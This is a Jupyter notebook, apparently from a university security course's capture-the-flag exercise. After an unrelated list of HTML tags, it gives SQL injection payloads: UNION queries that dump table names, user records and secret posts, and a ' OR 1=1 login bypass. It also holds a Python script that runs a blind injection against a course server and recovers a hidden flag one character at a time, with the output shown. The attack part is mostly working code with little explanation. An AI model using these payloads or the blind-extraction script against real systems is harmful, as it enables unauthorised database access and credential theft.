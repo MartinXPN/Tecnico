{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "a = \"\"\"\n",
    "<a>\tDefines a hyperlink\n",
    "<abbr>\tDefines an abbreviation or an acronym\n",
    "<acronym>\tNot supported in HTML5. Use <abbr> instead.\n",
    "<address>\tDefines contact information for the author/owner of a document\n",
    "<applet>\tNot supported in HTML5. Use <embed> or <object> instead.\n",
    "<area>\tDefines an area inside an image map\n",
    "<article>\tDefines an article\n",
    "<aside>\tDefines content aside from the page content\n",
    "<audio>\tDefines embedded sound content\n",
    "<b>\tDefines bold text\n",
    "<base>\tSpecifies the base URL/target for all relative URLs in a document\n",
    "<basefont>\tNot supported in HTML5. Use CSS instead.\n",
    "<bdi>\tIsolates a part of text that might be formatted in a different direction from other text outside it\n",
    "<bdo>\tOverrides the current text direction\n",
    "<big>\tNot supported in HTML5. Use CSS instead.\n",
    "<blockquote>\tDefines a section that is quoted from another source\n",
    "<body>\tDefines the document's body\n",
    "<br>\tDefines a single line break\n",
    "<button>\tDefines a clickable button\n",
    "<canvas>\tUsed to draw graphics, on the fly, via scripting (usually JavaScript)\n",
    "<caption>\tDefines a table caption\n",
    "<center>\tNot supported in HTML5. Use CSS instead.\n",
    "<cite>\tDefines the title of a work\n",
    "<code>\tDefines a piece of computer code\n",
    "<col>\tSpecifies column properties for each column within a <colgroup> element \n",
    "<colgroup>\tSpecifies a group of one or more columns in a table for formatting\n",
    "<data>\tAdds a machine-readable translation of a given content\n",
    "<datalist>\tSpecifies a list of pre-defined options for input controls\n",
    "<dd>\tDefines a description/value of a term in a description list\n",
    "<del>\tDefines text that has been deleted from a document\n",
    "<details>\tDefines additional details that the user can view or hide\n",
    "<dfn>\tSpecifies a term that is going to be defined within the content\n",
    "<dialog>\tDefines a dialog box or window\n",
    "<dir>\tNot supported in HTML5. Use <ul> instead.\n",
    "<div>\tDefines a section in a document\n",
    "<dl>\tDefines a description list\n",
    "<dt>\tDefines a term/name in a description list\n",
    "<em>\tDefines emphasized text \n",
    "<embed>\tDefines a container for an external application\n",
    "<fieldset>\tGroups related elements in a form\n",
    "<figcaption>\tDefines a caption for a <figure> element\n",
    "<figure>\tSpecifies self-contained content\n",
    "<font>\tNot supported in HTML5. Use CSS instead.\n",
    "<footer>\tDefines a footer for a document or section\n",
    "<form>\tDefines an HTML form for user input\n",
    "<frame>\tNot supported in HTML5.\n",
    "<frameset>\tNot supported in HTML5.\n",
    "<h1>\tDefines HTML headings\n",
    "<h2>\tDefines HTML headings\n",
    "<h3>\tDefines HTML headings\n",
    "<h4>\tDefines HTML headings\n",
    "<h5>\tDefines HTML headings\n",
    "<h6>\tDefines HTML headings\n",
    "<head>\tContains metadata/information for the document\n",
    "<header>\tDefines a header for a document or section\n",
    "<hr>\tDefines a thematic change in the content\n",
    "<html>\tDefines the root of an HTML document\n",
    "<i>\tDefines a part of text in an alternate voice or mood\n",
    "<iframe>\tDefines an inline frame\n",
    "<img>\tDefines an image\n",
    "<input>\tDefines an input control\n",
    "<ins>\tDefines a text that has been inserted into a document\n",
    "<kbd>\tDefines keyboard input\n",
    "<label>\tDefines a label for an <input> element\n",
    "<legend>\tDefines a caption for a <fieldset> element\n",
    "<li>\tDefines a list item\n",
    "<link>\tDefines the relationship between a document and an external resource (most used to link to style sheets)\n",
    "<main>\tSpecifies the main content of a document\n",
    "<map>\tDefines an image map\n",
    "<mark>\tDefines marked/highlighted text\n",
    "<meta>\tDefines metadata about an HTML document\n",
    "<meter>\tDefines a scalar measurement within a known range (a gauge)\n",
    "<nav>\tDefines navigation links\n",
    "<noframes>\tNot supported in HTML5.\n",
    "<noscript>\tDefines an alternate content for users that do not support client-side scripts\n",
    "<object>\tDefines a container for an external application\n",
    "<ol>\tDefines an ordered list\n",
    "<optgroup>\tDefines a group of related options in a drop-down list\n",
    "<option>\tDefines an option in a drop-down list\n",
    "<output>\tDefines the result of a calculation\n",
    "<p>\tDefines a paragraph\n",
    "<param>\tDefines a parameter for an object\n",
    "<picture>\tDefines a container for multiple image resources\n",
    "<pre>\tDefines preformatted text\n",
    "<progress>\tRepresents the progress of a task\n",
    "<q>\tDefines a short quotation\n",
    "<rp>\tDefines what to show in browsers that do not support ruby annotations\n",
    "<rt>\tDefines an explanation/pronunciation of characters (for East Asian typography)\n",
    "<ruby>\tDefines a ruby annotation (for East Asian typography)\n",
    "<s>\tDefines text that is no longer correct\n",
    "<samp>\tDefines sample output from a computer program\n",
    "<section>\tDefines a section in a document\n",
    "<select>\tDefines a drop-down list\n",
    "<small>\tDefines smaller text\n",
    "<source>\tDefines multiple media resources for media elements (<video> and <audio>)\n",
    "<span>\tDefines a section in a document\n",
    "<strike>\tNot supported in HTML5. Use <del> or <s> instead.\n",
    "<strong>\tDefines important text\n",
    "<style>\tDefines style information for a document\n",
    "<sub>\tDefines subscripted text\n",
    "<summary>\tDefines a visible heading for a <details> element\n",
    "<sup>\tDefines superscripted text\n",
    "<svg>\tDefines a container for SVG graphics\n",
    "<table>\tDefines a table\n",
    "<tbody>\tGroups the body content in a table\n",
    "<td>\tDefines a cell in a table\n",
    "<template>\tDefines a container for content that should be hidden when the page loads\n",
    "<textarea>\tDefines a multiline input control (text area)\n",
    "<tfoot>\tGroups the footer content in a table\n",
    "<th>\tDefines a header cell in a table\n",
    "<thead>\tGroups the header content in a table\n",
    "<time>\tDefines a specific time (or datetime)\n",
    "<title>\tDefines a title for the document\n",
    "<tr>\tDefines a row in a table\n",
    "<track>\tDefines text tracks for media elements (<video> and <audio>)\n",
    "<tt>\tNot supported in HTML5. Use CSS instead.\n",
    "<u>\tDefines some text that is unarticulated and styled differently from normal text\n",
    "<ul>\tDefines an unordered list\n",
    "<var>\tDefines a variable\n",
    "<video>\tDefines embedded video content\n",
    "<wbr>\tDefines a possible line-break\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "</a></abbr></acronym></address></applet></area></article></aside></audio></b></base></basefont></bdi></bdo></big></blockquote></body></br></button></canvas></caption></center></cite></code></col></colgroup></data></datalist></dd></del></details></dfn></dialog></dir></div></dl></dt></em></embed></fieldset></figcaption></figure></font></footer></form></frame></frameset></h1></h2></h3></h4></h5></h6></head></header></hr></html></i></iframe></img></input></ins></kbd></label></legend></li></link></main></map></mark></meta></meter></nav></noframes></noscript></object></ol></optgroup></option></output></p></param></picture></pre></progress></q></rp></rt></ruby></s></samp></section></select></small></source></span></strike></strong></style></sub></summary></sup></svg></table></tbody></td></template></textarea></tfoot></th></thead></time></title></tr></track></tt></u></ul></var></video></wbr>"
     ]
    }
   ],
   "source": [
    "for line in a.split('\\n'):\n",
    "    tag = line.split('\\t')[0]\n",
    "    print(tag.replace('<', '</'), end='')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (<ipython-input-119-99500aa62ab9>, line 1)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  File \u001b[0;32m\"<ipython-input-119-99500aa62ab9>\"\u001b[0;36m, line \u001b[0;32m1\u001b[0m\n\u001b[0;31m    list all tables:\u001b[0m\n\u001b[0m         ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "list all tables:\n",
    "l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master;--\n",
    "\n",
    "\n",
    "listl user table columns\n",
    "%' AND 1=2 UNION ALL SELECT name as id, name as content, name as title FROM PRAGMA_TABLE_INFO('user');--\n",
    "\n",
    "list all users\n",
    "%' AND 1=2 UNION ALL SELECT id as id, jackpot_val as content, username as title FROM user;--\n",
    "\n",
    "\n",
    "list secret_blog_post table columns\n",
    "%' AND 1=2 UNION ALL SELECT name as id, name as content, name as title FROM PRAGMA_TABLE_INFO('secret_blog_post');--\n",
    "\n",
    "list all contents of the secret_blog_post\n",
    "%' AND 1=2 UNION ALL SELECT id as id, content as content, title as title FROM secret_blog_post;--\n",
    "\n",
    "\n",
    "\n",
    "login as admin\n",
    "login: admin\n",
    "password:\n",
    "bik' OR 1=1;--"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:12102/'\n",
    "headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}\n",
    "\n",
    "\n",
    "async def nb_found(query):\n",
    "    params = {'search': query}\n",
    "    r = requests.get(SERVER, params=params, headers=headers)\n",
    "\n",
    "    return int(r.text.split('Found')[-1].split('articles')[0].strip())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1]"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import asyncio\n",
    "\n",
    "await asyncio.gather(*[\n",
    "    nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE 'u%';--\"),\n",
    "    nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE 'u%';--\"),\n",
    "])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing `super_s_sof_s`... \t Found 1 tables\n",
      "Processing `super_s_sof_se`... \t Found 1 tables\n",
      "Processing `super_s_sof_sec`... \t Found 1 tables\n",
      "Processing `super_s_sof_secr`... \t Found 1 tables\n",
      "Processing `super_s_sof_secre`... \t Found 1 tables\n",
      "Processing `super_s_sof_secret`... \t Found 1 tables\n",
      "Processing `super_s_sof_secrets`... \t Found 1 tables\n",
      "super_s_sof_secrets ['super_s_sof_secrets']\n",
      "super_s_sof_secret ['super_s_sof_secrets']\n",
      "super_s_sof_secre ['super_s_sof_secrets']\n",
      "super_s_sof_secr ['super_s_sof_secrets']\n",
      "super_s_sof_sec ['super_s_sof_secrets']\n",
      "super_s_sof_se ['super_s_sof_secrets']\n",
      "super_s_sof_s ['super_s_sof_secrets']\n",
      "super_s_sof_ ['super_s_sof_secrets']\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['super_s_sof_secrets']"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import string\n",
    "\n",
    "\n",
    "alphabet = string.ascii_lowercase + '_'\n",
    "\n",
    "\n",
    "async def find_table_names(prefix, limit):\n",
    "    res = []\n",
    "    last = True\n",
    "    \n",
    "#     if prefix.count('_') >= 3:\n",
    "#         return res\n",
    "    \n",
    "    nb_founds = await asyncio.gather(*[\n",
    "        nb_found(f\"l%' AND 1=2 UNION SELECT type as id, name as content, tbl_name as title FROM sqlite_master WHERE content LIKE '{prefix + c}%';--\")\n",
    "        for c in alphabet\n",
    "    ])\n",
    "    \n",
    "    for num, c in zip(nb_founds, alphabet):\n",
    "        if num != 0:\n",
    "            print(f'Processing `{prefix + c}`... \\t Found {num} tables')\n",
    "            res += await find_table_names(prefix + c, num)\n",
    "            last = False\n",
    "        if num == limit:\n",
    "            break\n",
    "    \n",
    "    if last:\n",
    "        res.append(prefix)\n",
    "    print(prefix, res)\n",
    "    return res\n",
    "\n",
    "await find_table_names('super_s_sof_', 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "await nb_found(\"%' AND 1=2 UNION ALL SELECT \"\\\n",
    "               \"name as id, name as content, name as title \"\\\n",
    "               \"FROM PRAGMA_TABLE_INFO('super_s_sof_secrets') WHERE name LIKE 'id%';--\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "await nb_found(\"%' AND 1=2 UNION ALL SELECT \"\\\n",
    "               \"id as id, secret as content, secret as title \"\\\n",
    "               \"FROM super_s_sof_secrets WHERE secret GLOB 'I*';--\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "302231454903657293676544"
      ]
     },
     "execution_count": 108,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "2**78"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "string.ascii_letters"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing `I`... \t Found 1 tables\n",
      "Processing `In`... \t Found 1 tables\n",
      "Processing `In `... \t Found 1 tables\n",
      "Processing `In c`... \t Found 1 tables\n",
      "Processing `In ca`... \t Found 1 tables\n",
      "Processing `In cas`... \t Found 1 tables\n",
      "Processing `In case`... \t Found 1 tables\n",
      "Processing `In case `... \t Found 1 tables\n",
      "Processing `In case I`... \t Found 1 tables\n",
      "Processing `In case I `... \t Found 1 tables\n",
      "Processing `In case I f`... \t Found 1 tables\n",
      "Processing `In case I fo`... \t Found 1 tables\n",
      "Processing `In case I for`... \t Found 1 tables\n",
      "Processing `In case I forg`... \t Found 1 tables\n",
      "Processing `In case I forge`... \t Found 1 tables\n",
      "Processing `In case I forget`... \t Found 1 tables\n",
      "Processing `In case I forget `... \t Found 1 tables\n",
      "Processing `In case I forget m`... \t Found 1 tables\n",
      "Processing `In case I forget my`... \t Found 1 tables\n",
      "Processing `In case I forget my `... \t Found 1 tables\n",
      "Processing `In case I forget my p`... \t Found 1 tables\n",
      "Processing `In case I forget my pa`... \t Found 1 tables\n",
      "Processing `In case I forget my pas`... \t Found 1 tables\n",
      "Processing `In case I forget my pass`... \t Found 1 tables\n",
      "Processing `In case I forget my passw`... \t Found 1 tables\n",
      "Processing `In case I forget my passwo`... \t Found 1 tables\n",
      "Processing `In case I forget my passwor`... \t Found 1 tables\n",
      "Processing `In case I forget my password`... \t Found 1 tables\n",
      "Processing `In case I forget my password `... \t Found 1 tables\n",
      "Processing `In case I forget my password i`... \t Found 1 tables\n",
      "Processing `In case I forget my password is`... \t Found 1 tables\n",
      "Processing `In case I forget my password is:`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: `... \t Found 1 tables\n",
      "Processing `In case I forget my password is: S`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SS`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSo`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_B`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Bl`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Bli`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blin`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_b`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_bu`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_c`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_ca`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_S`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_St`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Sti`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Stil`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_g`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gE`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_y`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yo`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoU`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_d`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_da`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_dat`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_datA`... \t Found 1 tables\n",
      "Processing `In case I forget my password is: SSof{I_m_Blind_but_I_can_Still_gEt_yoUr_datA}`... \t Found 1 tables\n"
     ]
    }
   ],
   "source": [
    "final_target = 'in_case_i_forget_my_password_is__ssof{i_m_blind_but_i_can_still_get_your_data}'\n",
    "alphabet = string.ascii_lowercase + \"{}_' -\"\n",
    "async def find_column_contents(prefix, limit):\n",
    "    \n",
    "#     if prefix.count('_') >= 3:\n",
    "#         return res\n",
    "    \n",
    "    i = len(prefix)\n",
    "    if i >= len(final_target):\n",
    "        return\n",
    "    if final_target[i] == '_':\n",
    "        choice = \"{}-_ ':;\"\n",
    "    else:\n",
    "        choice = set([final_target[i].lower(), final_target[i].upper()])\n",
    "    \n",
    "    nb_founds = await asyncio.gather(*[\n",
    "        nb_found(f\"%' AND 1=2 UNION ALL SELECT id as id, secret as content, secret as title FROM super_s_sof_secrets WHERE secret GLOB '{prefix + c}*';--\")\n",
    "        for c in choice\n",
    "    ])\n",
    "    \n",
    "    for num, c in zip(nb_founds, choice):\n",
    "        if num != 0:\n",
    "            print(f'Processing `{prefix + c}`... \\t Found {num} tables')\n",
    "            await find_column_contents(prefix + c, num)\n",
    "#         if num == limit:\n",
    "#             break\n",
    "\n",
    "await find_column_contents('', 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "in_case_i_forget_my_password_is__ssof{i_m_blind_but_i_can_still_get_your_data}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
